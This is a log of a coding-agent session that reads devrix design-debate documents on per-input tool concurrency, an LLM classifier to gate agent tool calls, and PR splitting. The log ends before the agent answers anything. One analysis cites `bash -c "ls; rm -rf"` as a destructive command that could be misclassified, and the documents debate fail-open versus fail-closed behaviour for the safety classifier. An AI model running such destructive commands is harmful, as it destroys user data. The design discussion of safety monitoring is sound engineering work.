Reading prompt from stdin...
OpenAI Codex v0.133.0
--------
workdir: /Users/fukai/workspace
model: MiniMax-M2.7
provider: custom
approval: never
sandbox: workspace-write [workdir, /tmp, $TMPDIR]
reasoning effort: high
reasoning summaries: none
session id: 019f228e-628b-7cd3-aa4d-7337589bc2bb
--------
user
你是 devrix 项目的 codex，需要在 Round 2 答辩 Claude 的强论证稿 + 反问。

工作目录: /Users/fukai/workspace/devrix
必读材料 (按顺序):
1. openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-debate-round1-claude.md (Claude 强论证稿, 12 个反问 Q1-Q12)
2. openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-analysis-claude.md (Claude 原始立场)
3. openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-analysis-cursor.md (Cursor 原始立场)
4. openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-analysis-codex.md (你 Round 0 自己的分析)

你是 Codex (MiniMax-M2.7), 你在 Round 0 主张:
- D1: 分层混合 (静态默认 + Bash override)
- D2: P2 interface only
- D3: 全删
- D4: 6 PR (维持)

答辩要求 (12 个反问中, 你需要重点答辩的):
- Q1: 全函数化方案中 15 工具的 IsConcurrencySafe 函数体长什么样? 反驳 Claude 说"分层混合节省 80%" 是否高估?
- Q2: 分层混合的 4 工具 override 具体列表? (你之前说 Bash, 给我完整 4 个 + 判定规则)
- Q3: 从默认静态迁移到 per-input 函数的迁移路径
- Q4: auto-mode 准备拦截哪种已知攻击? 真实案例 (devrix 历史上的 incident)
- Q5: P2 interface only 何时升级 P1? 触发 metric
- Q6: 5s timeout 默认 allow (fail-open) 还是 deny (fail-closed)?
- Q7: 本 change 完成后 3 个月内, 你具体会用 GrowthBook flag 调什么?
- Q8: Cursor 引用 persist/growthbook_override.go:1-9 作为先例 — 那个 GB 的调用方是谁?
- Q9: 降 P2 / 全删 后的升级触发条件?
- Q10: PR-D 合入 + PR-E 未合期间 master 状态?
- Q11: 6PR 顺序合入的 bug 定位?
- Q12: PR 数量 vs 延期的因果关系?

输出格式 (markdown, 到 stdout):
- 对每个 Q 给出: 我的回答 + 是否让步 (是/否 + 条件) + 如果让步, 倾向哪个立场
- 最后一段: 总结让步矩阵 (12 个 Q 各自最终立场)

绝对不要修改任何文件, 只输出到 stdout。
codex
I'll read the required materials in order to prepare for the Round 2 defense.

exec
/bin/zsh -lc 'cat "/Users/fukai/workspace/devrix/openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-debate-round1-claude.md"' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
# 博弈论辩论 Round 1 — Claude 强论证稿

**日期:** 2026-07-02
**作者:** Claude (辩论者, 不是综合者)
**任务:** 强论证 4 个差异点, 让 codex + cursor 在 Round 2 答辩
**输入:** 三方独立分析 (claude / codex / cursor) + devrix 源码

---

## 0. 辩论方法

每个差异点用**辩论赛格式**:
1. 需求原状 + 三方立场 (立场表)
2. **最强论据** (我评估谁最有力, 给出具体证据)
3. **核心反问** (让 codex + cursor 答辩)

---

## D1: per-input 函数 — 全函数化 vs 分层混合

**立场表:**
- Claude (Round 0): 全函数化
- Codex: 分层混合 (静态默认 + Bash override)
- Cursor: 全函数化

**我的强论证 (Round 1):**

Codex 的**分层混合** 方案是**工程性价比最优解**, 理由:

1. **表达力边界**: per-input 函数的核心价值是处理**input 决定 outcome** 的工具:
   - Bash: `isReadOnly(input)` → `IsConcurrencySafe(input)`
   - read_file: 1GB 文件截断行为 → 决定 8K 截断时不该并发 (sequential, 不浪费 slot)
   - Edit / Write: 同 target 路径互斥 (concurrent 会冲突)
   - **其他 15 个工具**: 静态 bool 已经正确, 写函数是 boilerplate

2. **Codex 引用了关键事实** (验证):
   - `tool_surface.go:39-43` 已有 `ConcurrencySafe bool` 字段
   - 19 工具 surface 的默认值已在 `orthogonal_flags.go` 真值表
   - **不是"重写 19 工具", 是"在 4 工具加 override, 15 工具走默认"**

3. **回归成本对比**:
   - 全函数: 19 工具 × 1 函数 + 19 × 3 单测 = ~600 行 + 57 单测
   - 分层混合: 4 工具 override + 4 × 3 单测 + 1 个 default 路由 = ~120 行 + 12 单测
   - **节省 ~80% 工作量, 治本效果等价** (Bash 串行/并发正确, read_file size 正确)

4. **未来兼容**: 当未来某个工具需要 per-input 决策时, 只需给它加 override 方法, **不破坏现有 15 工具的 default 路由**。

**反方 (全函数化) 反驳: "15 工具也写函数, 表达力统一, 后续迁移无成本"**
- 反驳的反驳: "表达力统一"在 15 工具**永远不需要 per-input 决策**时是过度抽象。**YAGNI 原则**。

**核心反问 codex + cursor:**
- R1-Q1: 全函数化方案中, 对**15 个永远不需要 per-input 决策的工具**, 它们的 `IsConcurrencySafe(input)` 函数体应该长什么样? (期望: 它们就是返回 `s.ConcurrencySafe` 字段, 即 boilerplate)
- R1-Q2: 分层混合的"4 工具 override"具体指哪 4 个? 给我**完整列表 + 判定规则** (不是只举 Bash)
- R1-Q3: 如果未来 Edit 工具需要 per-input 决策 (e.g. 同一文件两次 Edit 不能并发), 怎么从"默认静态"迁移到"per-input 函数"? 给我**迁移路径** (而非直接全函数化预防)

---

## D2: auto-mode classifier 优先级

**立场表:**
- Claude: P0 实施 + 默认关
- Cursor: 必要, P0
- Codex: **只加 interface, P2**

**我的强论证 (Round 1):**

Codex 的 **P2 interface only** 是**最佳策略**, 理由:

1. **default OFF = 死代码论据** (Codex + Claude 一致):
   - P0 实施后, 5s timeout 硬上限 + 默认关闭 + Production-Safety = 实际**长期不工作**
   - "实施但不启用" 在 devrix 历史上有先例: **`persist/growthbook_override.go:1-9` 的 GB 模式就是 P0 实施 + 渐进放量**, 但那是有**已存在的 100K 阈值调优需要**; auto-mode 当前**没有任何已存在的安全需求**触发它

2. **中间层防御的"中间"是问题**:
   - 静态规则 (`CheckPermission`) → VerifyContract 4 元组 → 这两段**已够用**
   - auto-mode 插在中间, 实际是**无主用途**:
     - 静态规则放行 (因为 `curl` 在白名单) → auto-mode 应该 deny?
     - 但 auto-mode deny 后, VerifyContract 也会 deny (因为 4 元组 ground truth)
     - **auto-mode 跟 VerifyContract 高度重叠**, 价值在哪儿?
   - Cursor 说"补执行前防线空洞" — 但静态 + Verify 已**没有空洞** (devrix 没被这类攻击攻破过)

3. **"P2 interface only" 的价值**:
   - 加 `ClassifyToolUse(transcript, sideQuery) YoloResult` 方法签名 → **0 行实际代码**
   - 后续 P1 change 触发时, 直接接线, 不用再讨论 interface 设计
   - 节省 AC4-AC7 + AC11 ≈ 1 周工时

4. **Codex 的隐性论据** (需求文档自己也承认):
   - 需求 §2.3 "不在本次目标" 列出 6 项 OOS, 其中 OOS-NEW-2 (ensemble classifier) 和 OOS-NEW-3 (跨 session reputation) 才是 auto-mode 真正发挥的场景
   - 需求 §2.1 把 auto-mode 当 P0 实施, 跟 §2.3 自己矛盾 — **需求文档内部不自洽**

**反方 (Cursor P0) 反驳: "结构上必要, 不能推迟"**
- 反驳的反驳: "结构必要"必须有"结构缺口"证据。**devrix 当前结构无缺口**, auto-mode 是预防性架构, 不是修复性架构。
- 类比: "数据库备份" 是结构必要, 但你不会**今天**就为生产数据库搭建异地多活备份, 你会 P2 评估后再做。

**核心反问 codex + cursor:**
- R1-Q4: auto-mode 准备拦截**哪种已知**的安全攻击? 给我**真实案例** (devrix 历史上的具体 incident), 不要泛泛说"LLM 幻觉" — VerifyContract 4 元组已经能抓 LLM 幻觉
- R1-Q5: 如果走 P2 interface only, 何时升级到 P1 实施? **触发条件** 是什么? 给我可观测的 metric (e.g. `verify_contract_deny_rate > X%` 触发 auto-mode 开启)
- R1-Q6: P0 实施 auto-mode 后, 5s timeout 默认 allow (fail-open) 还是 deny (fail-closed)? 需求 §6 风险表写"fail-open" — 但 fail-open 在安全场景 = 灾难, 是否矛盾?

---

## D3: GrowthBook (AC11) 借鉴必要性

**立场表:**
- Claude: 降 P2
- Cursor: **保留 P0** (引用 `persist/growthbook_override.go:1-9` 已有先例)
- Codex: **全删**

**我的强论证 (Round 1):**

**Codex 的"全删"过于激进, 我倾向 Claude 的"降 P2"**, 理由:

1. **Cursor 的论据"横向复用"成立, 但只对半**:
   - `persist/growthbook_override.go:1-9` 确实存在 — **但它是为"已存在的 100K 阈值调优需要" 服务的**
   - 本 change 的 GrowthBook 是"为**可能未来**的 per-tool 阈值/分类器/并发调优服务" — **需求是推测的, 不是已存在的**
   - 区别: persist/ 是 **修复型 GB** (有具体调优目标), 本 change 是 **预防型 GB** (无具体调优目标)

2. **预防型 GB 的成本**:
   - 19 工具 default: 19 × override 注册 ≈ 200 行
   - Production-Safety 检查: 防止未 flag 开启时影响用户行为 ≈ 50 行 + 1 个 CI gate
   - 测试矩阵: 19 工具 × enable/disable 状态 ≈ 38 单测
   - **总计 ~300 行 + 38 单测, 全部是为了"未来某天可能调"**

3. **降 P2 的合理性**:
   - 等真实运营需要 (e.g. "我们要把 Bash 的 5s timeout 调到 8s, 但只对 5% 用户") 时再加
   - 此时 GB 代码**只需要写一次** (因为有 persist/ 的成熟模式可参考)
   - **现在写 = 写一个**猜测性 API, 未来实际需求来了可能不匹配, 要重写

4. **Codex "全删"过于激进的原因**:
   - devrix 文化是**有可观测 hook 优先** (Observation 节点)
   - 删 GB 意味着将来运营需要时, 从零搭建更费时
   - **降 P2 保留 hook 点位, 是 devrix 文化的更佳平衡**

**反方 (Cursor P0) 反驳: "横向复用, 模式已成熟"**
- 反驳的反驳: 模式已成熟 ≠ 现在就需要。**devrix 资源是有限的**, 应当把 P0 资源用在"现在就有真实需求"的项 (per-input 函数) 上, 而非"未来可能有需求"的项 (GB 调优)。

**核心反问 codex + cursor:**
- R1-Q7: 本 change 完成后 3 个月内, 你**具体**会用 GrowthBook flag 调什么? 给我**真实调优目标** (e.g. "Bash 5s → 8s 调优"), 不要泛泛说"per-tool 阈值"
- R1-Q8: Cursor 引用 `persist/growthbook_override.go:1-9` 作为先例 — 那个 GB 调用方是**谁**? (是 devrix 内部 ops, 还是用户配置?) 同样模式搬到本 change, 调用方是谁?
- R1-Q9: 降 P2 后, 未来触发"升级到 P1 实施"的具体条件是什么? 跟 D2-Q5 一样, 要可观测的 metric

---

## D4: PR 数量 (5 vs 6)

**立场表:**
- Claude: 5 PR (合并 D+E)
- Cursor: 5 PR (合并 D+E, 反驳 Codex 6 PR 理由)
- Codex: **6 PR (维持)**

**我的强论证 (Round 1):**

**Claude + Cursor 一致的"5 PR"是最优解**, Codex 反对理由不充分, 理由:

1. **devrix 现状文化** (参考 memory):
   - **Hotfix 模式** (DM-20260629-007 + 后续) + **用户验收纪律**
   - "实现+测试+重启脚本让用户验收" 是 devrix 主流模式, 不是"分 PR 等 review"
   - 6 PR 适合**外部贡献者多**的项目, 不适合 devrix 这种**单一团队 + 用户即时反馈**的模式

2. **Codex 的"review 面更窄"是错的**:
   - 6 PR 把 classifier 实现 (PR-D) 和 classifier 测试 (PR-E) 拆开 → **reviewer 看到 PR-D 时, 没法判断"测试能否覆盖实现"**
   - 5 PR 合并 D+E → **reviewer 看到完整闭环**, 一句话能下结论
   - **拆开不是降低 review 难度, 是增加 review 复杂度** (要跨 PR 串行思考)

3. **风险分散的代价**:
   - 6 PR 顺序 merge → 中间任意 PR 有 bug → 后续 PR 难定位 (是它自己的还是上一 PR 的?)
   - 5 PR 原子 → bug 在一个 PR 内, 定位简单
   - **风险分散 ≠ 风险降低, 风险分散 = 风险跨边界**

4. **DM-20260702-008 教训** (Codex 自己引用):
   - "9 P1 T 延期" = **一个 change 内 PR 拆分过细** 导致延期
   - 本 change 学教训: 5 PR 而不是 6 PR

**反方 (Codex 6 PR) 反驳: "半成品时间窗"**
- 反驳的反驳: "半成品" 是**本地开发未提交**的中间态, 不是"已提交未合"的状态。5 PR 不代表**不开发 PR-E 的测试**, 只代表**测试和实现同 PR 提交**。

**核心反问 codex (cursor 跟 Claude 一致, 无需问 cursor):**
- R1-Q10: PR-D (classifier 集成) 合入后, PR-E (测试 + telemetry) **没合**期间, devrix master 分支处于什么状态? 是"功能上线但无测试" 还是"无功能"? 哪种状态可接受?
- R1-Q11: 你说"6 PR 顺序合入" — 给个**真实场景**: 假设 PR-D 合了, PR-E 跑测试发现 classifier 集成有 bug, 怎么 revert? 单独 revert PR-D 还是会连带 PR-E 一起? 跟 5 PR 比, 5 PR 怎么操作?
- R1-Q12: 你引用 "DM-20260702-008 9T 延期" — 那是**9 个 P1 T 延期** (延期是**任务延期**, 不是 **PR 数量过多**)。**PR 数量跟延期是因果关系吗? 还是只是相关性?**

---

## 总结: Round 1 倾向

| # | 决策项 | 我的倾向 | 关键反问 (3 个) |
|---|--------|---------|----------------|
| D1 | per-input 实现 | **Codex 分层混合** (3 工具 + Edit = 4 工具 override) | Q1-Q3 |
| D2 | auto-mode classifier | **Codex P2 interface only** | Q4-Q6 |
| D3 | GrowthBook | **Claude 降 P2** (非 Codex 全删) | Q7-Q9 |
| D4 | PR 数量 | **5 PR (Claude+Cursor 一致)** | Q10-Q12 |

**请 codex + cursor 在 Round 2 答辩以上反问, 我将基于答辩做最终收敛。**

---

## 附录: 三方最尖锐的"互相"反驳记录

| 三方互驳 | 原文 | 评估 |
|---------|------|------|
| Codex 驳 Claude (D1) | "全函数化是过度工程, 15 工具写 boilerplate" | **强论据** |
| Codex 驳 Cursor (D2) | "5s timeout + 默认关闭 = 死代码, 长期不实战" | **强论据** |
| Cursor 驳 Codex (D3) | "devrix 已有 GB 模式, 是 baseline + runtime override 治理复用" | **部分对, 缺需求证据** |
| Codex 驳 Claude+Cursor (D4) | "6 PR review 面更窄" | **弱论据** (devrix 文化是即时反馈, 不是分 PR review) |
| Cursor 驳 Codex (D1) | (Cursor 跟 Claude 一致, 未独立驳 Codex D1) | — |
| Cursor 驳 Claude (D2) | (Cursor 跟 Claude 一致, 反对 Codex P2) | 弱论据, 见 D2-Q4 |

**预期 Round 2 焦点**: D1 + D2 + D3 三个差异点 (D4 三方一致度最高)。

exec
/bin/zsh -lc 'cat "/Users/fukai/workspace/devrix/openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-analysis-claude.md"' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
# Claude 博弈论分析 — DM-20260702-009

**日期:** 2026-07-02
**作者:** Claude (MiniMax-M3)
**立场:** 治本派 + 借鉴派平衡
**核心态度:** 2 个治本接受, 4 项 tech-debt 收口 OK, 但**默认全关的 GrowthBook + 借鉴 clawcode `inputsEquivalent` + LLM SideQuery auto-mode 是过度工程**, 需博弈裁剪

---

## 博弈点 1: per-input 函数 vs 字段化 metadata

**Claude 立场:** **per-input 函数 (clawcode 路线)**, 但要加 fail-safe 机制

- 字段化 (`ToolSpec.IsConcurrencySafePerInputMode enum`) 退化成"配置描述", 表达力不够 (bash 的 isReadOnly 是 command 解析问题, 不是配置问题)
- 函数化是唯一能处理 bash read-only detection / read_file size 判断 / write target path 互斥的方案
- **风险**: 抛错上抛 → 整个 turn 崩溃。AC6 fail-safe 强制要求 catch + false, 接受
- **额外建议**: 加 `IsConcurrencySafePanics` metric, 当 catch 到 panic 时记 1 次, **不要让 fail-safe 变成静默 bug 容器**

## 博弈点 2: auto-mode classifier 是否必要

**Claude 立场:** **P0 实施但默认关闭**, P1 之后根据实战数据决定是否打开

- VerifyContract 4 元组是 ground truth, **不可替换**
- auto-mode 是 **intermediate defense**, 在静态规则后、VerifyContract 前的"二次机会"
- 风险: LLM 幻觉, fail-open 默认 (5s timeout 后 allow) 不安全
- **关键设计**: SideQuery 必须用独立 LLM (避免主 LLM 自我审查), 5s timeout 硬上限, 默认 **OFF** (Production-Safety)
- **疑问**: 谁触发? 自动 (每个 tool_call)? 还是用户开关? 需求写"auto-mode", 但 P0 全关矛盾 — 需博弈

## 博弈点 3: tech-debt 收口策略

**Claude 立场:** **4 项一起收, 但 PR-F 单独立项**

- TD-STE-01 (混合批次并发) 跟 PR-B 强绑定, **必须 PR-B 一起**
- TD-STE-02 (Bash sibling abort) 单独 PR-F, 影响 Bash tool 语义
- TD-STE-03 (discard on fallback) 单独 PR-F, 依赖 TD-QL-03 已 CLOSED
- TD-STE-06 (ConcurrencySafe 注册表) 跟 PR-A 一起, 19 工具默认实现
- **理由**: PR-A/B 治本, PR-F 收债, 6 PR 划分清晰

## 博弈点 4: PR 拆分粒度

**Claude 立场:** **接受 6 PR, 但 PR-E 跟 PR-D 合并, 5 PR 即可**

- PR-D (classifier 集成) + PR-E (测试 + telemetry + e2e) **本质同一 PR**, 拆开会拉长回归期
- 5 PR 更紧凑: A interface / B partition / C ToAutoClassifier / D classifier+test+e2e / F GrowthBook+abort+discard+inputsEquivalent
- 反对意见: 6 PR 利于 review, 但 devrix 现状 (Hotfix 模式 + 用户验收) 5 PR 足够

## 博弈点 5: GrowthBook + inputsEquivalent 借鉴是否过度

**Claude 立场:** **GrowthBook 接受 (T25), inputsEquivalent (T28) 降级 P2 或 P3**

- GrowthBook runtime override 是 P0 (AC11), 但**默认全关 + Production-Safety** 的话, 实际是**死代码**。建议: GrowthBook **降 P2**, P0 阶段不接, 后续根据实际运营需要再启用
- `inputsEquivalent(a, b []byte) bool` (AC14 P2): 19 工具 × 3 case = 57 单测, **重复工作大, 价值小**。devrix ContentReplacementState (T04 已落地) 已经能感知内容变化, **inputsEquivalent 是它的弱化版**。建议**降 P3** 或直接删

## 借鉴 vs 保留创新 — 评估清单

| devrix 创新 | clawcode 借鉴 | Claude 评价 |
|------------|--------------|------------|
| EmissionClass 4 类路由 | 无 | ✅ 架构性, 保留 |
| VerifyContract 4 元组 | 无 (VerifyContract 是 devrix 独有) | ✅ 第一道安全, 保留 |
| MUPS 5 节点 | 无 | ✅ 保留 |
| Learn FeedbackMemory | 无 (clawcode 无 Learn 节点) | ✅ 保留 |
| LTL-Lite L4-L6 | 无 | ✅ 保留 |
| Token Design 2.0 | 无 | ✅ 保留 |
| ConvergenceContract 4 control plane | 无 | ✅ 保留 |
| IsConcurrencySafe 函数 | per-input 函数 | ✅ 接受 |
| partitionToolCalls | clawcode 真实做法 | ✅ 接受 |
| ToAutoClassifierInput | clawcode 真实做法 | ✅ 接受 |
| AutoModeClassifier | yoloClassifier | ✅ 接受, 默认关 |
| toCompactBlock JSONL | clawcode 真实做法 | ✅ 接受 |
| Bash sibling abort | clawcode 真实做法 | ✅ 接受 |
| StreamingToolExecutor.Discard() | 弱相关 (clawcode 无 discard) | ✅ 接受, TD-QL-03 已 CLOSED |
| **inputsEquivalent** | clawcode 35 字段 | ⚠️ 弱需求, 建议降 P3 |
| **GrowthBook override** | clawcode 无 (devrix 内部需求) | ⚠️ 默认全关是死代码, 建议降 P2 |

## 关键风险 (高 → 低)

1. **auto-mode classifier 默认关 = 死代码, 但 P0 强制实施** — 浪费工时
2. **Bash isReadOnly 误判** — 误把 `bash -c "ls; rm -rf"` 标并发, 缓解: 必须 parse 整个 command tree
3. **SideQuery LLM 不可用** — fail-open 不安全, 但 hard timeout 后 fail-open 是 clawcode 做法
4. **partitionToolCalls 改造破坏现有并发行为** — AC1 强制 19 工具默认保持 v2, 接受

## 共识诉求

- **三方共识**点: per-input 函数 + auto-mode classifier 默认关 + 6 PR 拆分 + 4 tech-debt 收口
- **争议**点: GrowthBook (P0 vs P2) + inputsEquivalent (P2 vs P3) + PR-D/E 是否合并 + auto-mode 谁触发
- **待用户裁决**: GrowthBook 降 P2? inputsEquivalent 删或降 P3? auto-mode 触发模式?


exec
/bin/zsh -lc 'cat "/Users/fukai/workspace/devrix/openspec/changes/devrix-d2-tool-input-aware-concurrency-and-classifier/gaming-analysis-cursor.md"' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
Connection lost, reconnecting to https://api2.cursor.sh (attempt 1)...
Retry attempt 1...
Connection lost, reconnecting to https://api2.cursor.sh (attempt 2)...
Retry attempt 2...
Connection lost, reconnecting to https://api2.cursor.sh (attempt 3)...
Retry attempt 3...
# 独立博弈论分析 — DM-20260702-009

## 总判断
我的独立立场是：**治本方向应接受，但要严格区分“必须现在收口的内核问题”和“可后移的运维/缓存精修问题”**。  
5 个博弈点里，我支持 `per-input` 并发判定、支持引入 `auto-mode classifier` 但仅作为默认关闭的中间防线、支持 **4 项 tech-debt 在同一 change 内收口**，但**不支持把所有尾项都压成同等 P0 强度**。在拆 PR 上，我偏向 **5 PR** 而不是 6 PR；在 clawcode 借鉴上，我认为 **GrowthBook 值得保留，`inputsEquivalent` 不值得在本 change 强推**。

---

## 博弈点 1: `per-input` 函数 vs 字段化 metadata

**我的立场:** 选 **`per-input` 函数**，不要继续停留在字段化 metadata。

**理由**
1. devrix 当前并发判定就是静态 `ToolSpec.ConcurrencySafe`，并由 `ExecuteRound` 直接按 tool name 查表做并发/串行分流；这天然只能表达 “这个工具通常能否并发”，表达不了 “这次输入是否安全并发”。
2. 当前真值表还把 `bash` 静态标成并发安全，这说明静态 metadata 在 Bash 这种“同工具、异输入、风险差异极大”的工具上，语义已经不够精确。
3. `BuiltinSurface.CheckPermission()` 已经证明 devrix 接受“按输入解析后再决策”的模式：它会把 Bash 的 JSON 输入反序列化、抽出 `command`，再交给 `bashAST.Check()`。并发安全本质上也是同类问题，应该沿这个接口风格推进，而不是新增另一层 declarative 枚举。

**源码依据**
```295:343:internal/bootstrap/turn_adapter.go
func (a *contextEngineAdapter) ExecuteRound(ctx context.Context, req sessionorchestrator.ToolRoundRequest) (sessionorchestrator.ToolRoundResult, error) {
	// ...
	concSafe := a.concurrencyMap()
	// ...
	for i, tc := range req.ToolCalls {
		if results[i].Error != "" {
			continue
		}
		if concSafe[tc.Name] {
			parallelIdx = append(parallelIdx, i)
			continue
		}
		results[i] = a.executeOne(toolCtx, req.SessionID, tc)
	}
	// ...
}
```

```39:42:internal/shared/contracts/tool_surface.go
// ConcurrencySafe: multiple invocations of the same tool may run in parallel
// without mutual interference (e.g. read_file on different paths).
ConcurrencySafe bool
```

```44:53:internal/layers/contextengine/enforce/tools/surface/orthogonal_flags.go
func OrthogonalFlagFor(toolName string) (readOnly, destructive, openWorld, concurrencySafe bool) {
	switch toolName {
	case "read_file":
		return true, false, false, true
	// ...
	case "bash":
		return false, true, false, true
```

```129:143:internal/layers/contextengine/enforce/tools/surface/builtin_surface.go
func (s *BuiltinSurface) CheckPermission(_ context.Context, spec contracts.ToolSpec, input json.RawMessage) contracts.Decision {
	if spec.Name != "bash" {
		return contracts.DecisionAllow
	}
	// ...
	var in struct {
		Command string `json:"command"`
	}
	if err := json.Unmarshal(input, &in); err != nil {
		return contracts.DecisionAsk
	}
	decision, _ := s.bashAST.Check(in.Command)
	return decision
}
```

**反方意见**
- 字段化 metadata 更符合 devrix 一贯的 spec-first 设计，评审更容易，测试门禁也更集中。
- `per-input` 函数把策略逻辑塞回代码，会稀释 `orthogonal_flags.go` 那种“表驱动可审查性”。

**我的回应**
- 对于 `ReadOnly/OpenWorld/Destructive` 这类“静态能力描述”，表驱动是对的。
- 但 `ConcurrencySafe` 对 Bash、未来 MCP、甚至大文件 read 场景已经不是“静态能力描述”，而是**输入相关判定**。继续字段化，只会制造一个看起来声明式、实则不断打补丁的伪抽象。

---

## 博弈点 2: auto-mode classifier 是否必要

**我的立场:** **必要，但只能是默认关闭的第二道防线，且不能凌驾于 VerifyContract 与前置权限检查之上。**

**理由**
1. devrix 当前已经有两层相关机制，但都不覆盖“执行前、静态规则之后”的空窗：
   - `surface.CheckPermission()` / `IPermissionGate.CheckPermission()` 是**前置静态规则**。
   - `VerifyContract` 是**事后审计**，关注 deliverable/evidence/source quality，不是执行前安全判定。
2. 这意味着如果某个输入穿透了静态规则，执行已经发生；Verify 再强，也只能在事后说“这不对”，无法撤销副作用。
3. 同时，devrix 已经有 **SubQuery** 基础设施，说明“拉起独立副查询、带独立上下文预算执行一个次级判断”在架构上是现成路径，不是凭空造系统。
4. 但现阶段必须 **默认关闭**，因为现有 `decisionplanning/classifier.go` 仍是 rule-only、deterministic、hot-path 导向；把 LLM classifier 直接常开，会和当前“快路径、确定性、低延迟”原则冲突。

**源码依据**
```349:399:internal/bootstrap/turn_adapter.go
func (a *contextEngineAdapter) checkPermission(toolCtx context.Context, sessionID string, tc llmgateway.ToolCall) (sessionorchestrator.ToolResult, bool) {
	// ...
	decision := surf.CheckPermission(toolCtx, specVal, json.RawMessage(tc.Input))
	if decision == contracts.DecisionAllow {
		return sessionorchestrator.ToolResult{}, false
	}
	if decision == contracts.DecisionAsk && a.perm != nil {
		decision = a.perm.CheckPermission(toolCtx, specVal)
	}
	// ...
}
```

```54:66:internal/layers/orchestration/executionflow/verify/verify_contract.go
// VerifyContract is the 4-tuple input contract that the Verify node
// MUST validate before issuing a Verdict
//
// The 4 tuples are:
//  1. expected_class
//  2. deliverable_text
//  3. evidence
//  4. source_uncertainty
type VerifyContract struct {
```

```205:269:internal/layers/orchestration/executionflow/verify/verify_contract.go
func (c VerifyContract) Verify(input VerifyInput) (*Verdict, error) {
	// Check 1: deliverable_text
	// Check 2: evidence
	// Check 3: calibrated_confidence
	// All checks pass -> VerdictPass
}
```

```68:82:internal/layers/contextengine/enforce/subquery.go
func Run(ctx context.Context, deps SubQueryDeps, params SubQueryParams) (*SubQueryResult, error) {
	// ...
	tools := params.Tools
	if params.ReadOnlyTools {
		tools = filterReadOnlyTools(tools)
	}
```

```18:24:internal/layers/orchestration/decisionplanning/classifier.go
// The classifier must:
//   - Be safe for the FastPath hot path: no allocations beyond the result;
//     sub-millisecond on the rule set.
//   - Be deterministic: same input → same output
//   - Honor CommandFirst
```

**反方意见**
- VerifyContract 已经是 ground truth，再加 classifier 是重复防线。
- 5s timeout + 默认关闭，容易变成“实现了但不生效”的死代码。
- LLM classifier 可能幻觉，反而引入新的 false allow / false deny。

**我的回应**
- 它不是替代 VerifyContract，而是补 `CheckPermission -> Execute -> Verify` 之间的空洞。
- 但我同意：**如果不把触发条件、失败策略、可观测性写死，这会滑向死代码**。因此只能接受“默认关闭 + 5s 硬超时 + fail-safe + telemetry + VerifyContract 不降权”的版本。

---

## 博弈点 3: tech-debt 收口策略

**我的立场:** **4 项一起收，但必须分“主线治本”与“尾债封口”两层推进，而不是平均用力。**

**理由**
1. `TD-STE-01` 和 `TD-STE-06` 与本 change 的两大根因直接同源：一个是分批并发，一个是并发安全判定粒度，应该与主线一起收。
2. `TD-STE-02` 和 `TD-STE-03` 不是根因，但它们都属于同一执行器语义闭环：并发 sibling 取消、fallback discard。如果主线改了批次执行，却把这两项继续挂着，新的执行语义仍然不完整。
3. tech-debt 文档本身已经把 4 项都明确标成由本 change 关闭，说明 OpenSpec 叙事上已经合流；这时再拆成多个 change，收益不大，反而增加 SoT 漂移。

**源码依据**
```22:34:openspec/tech-debt/streaming-tool-executor-v2.md
Devrix v1 `StreamingToolExecutor` 仅在 **整批工具全部 concurrency-safe** 时才并行。
clawcode 支持 **混合批次**（只读工具并行 + 写工具独占）、并行 Bash 兄弟取消、fallback discard、执行中 progress 流式输出。

| 能力 | Devrix v1 | clawcode | 目标 / 状态 |
|------|-----------|----------|------|
| 混合批次并发 | 全 safe 才并行 | safe 可与 safe 并行；unsafe 独占 | **TD-STE-01 → CLOSED T18** |
| Bash 并行 sibling abort | 无 | `siblingAbortController` | **TD-STE-02 → CLOSED T26** |
| fallback 时 discard 在途工具 | 无 | `discard()` + synthetic error | **TD-STE-03 → CLOSED T27** |
| per-tool `isConcurrencySafe` | 硬编码 switch | 工具定义回调 | **TD-STE-06 → CLOSED T16-T17** |
```

```456:472:internal/bootstrap/turn_adapter.go
func (a *contextEngineAdapter) concurrencyMap() map[string]bool {
	m := make(map[string]bool, 32)
	for _, s := range a.surfaces {
		// ...
		for _, sp := range s.Tools(context.Background(), "", "") {
			m[sp.Name] = sp.ConcurrencySafe
		}
	}
	return m
}
```

**反方意见**
- 一次收 4 项会把 change 变厚，验证矩阵放大。
- `TD-STE-02/03` 更像 executor 语义细节，完全可以后续独立做。

**我的回应**
- 如果是实现层，我会主张分批；但从博弈论看，这个 change 的叙事核心就是“把 streaming tool executor 从 v1 粗粒度修到可长期站住的 v2”。  
- 所以 **同 change 收口是对的，分 PR 落地即可**。

---

## 博弈点 4: PR 拆分粒度

**我的立场:** **5 PR 优于 6 PR**，应合并 `PR-D/PR-E`。

**理由**
1. `PR-D`（classifier + toCompactBlock + 集成）与 `PR-E`（classifier tests + telemetry + e2e）技术上是同一能力的两个半边，拆开会出现一个“系统已接线但验证还没合上”的中间态。
2. devrix 当前已有明确的 no-silent-default / gate 型测试文化；对于 classifier 这种高风险变更，**实现与回归应同 PR 原子出现**，否则 reviewer 很难给出稳定结论。
3. 相反，`PR-A/B/C/F` 的边界是清楚的：接口/并发调度/投影/classifier闭环以外的尾项。

**源码依据**
```3:19:internal/shared/contracts/tool_surface_v3.go
// v2 ToolSpec has 9 fields; v3 adds 6 control plane fields at the END
// of the struct to guarantee position-struct-literal backward compat.
// ...
// T14 gate forbids this fallback for any registered tool
```

```225:229:internal/layers/contextengine/enforce/tools/surface/orthogonal_flags_test.go
// T: D2-S15-A02-T08 — DefaultV3MetadataFor returns the 6 control plane
// fields per the 19-tool truth table. Each registered tool MUST have an
// explicit entry; the gate (T14) fails the build if any registered surface
// returns a spec whose v3 fields are the zero defaults.
```

**反方意见**
- 6 PR review 面更窄，风险更可控。
- `PR-E` 独立能让 telemetry/e2e 单独评审，不被 classifier 实现噪音淹没。

**我的回应**
- 如果 `PR-E` 是横跨多模块的补测试 PR，我会同意拆；但这里它主要服务 `PR-D`，拆开后的“半成品时间窗”比 review 便利更危险。  
- 所以我赞成 **5 PR：A / B / C / D(+E) / F**。

---

## 博弈点 5: GrowthBook (P0 AC11) + `inputsEquivalent` (P2 AC14) 是否过度工程

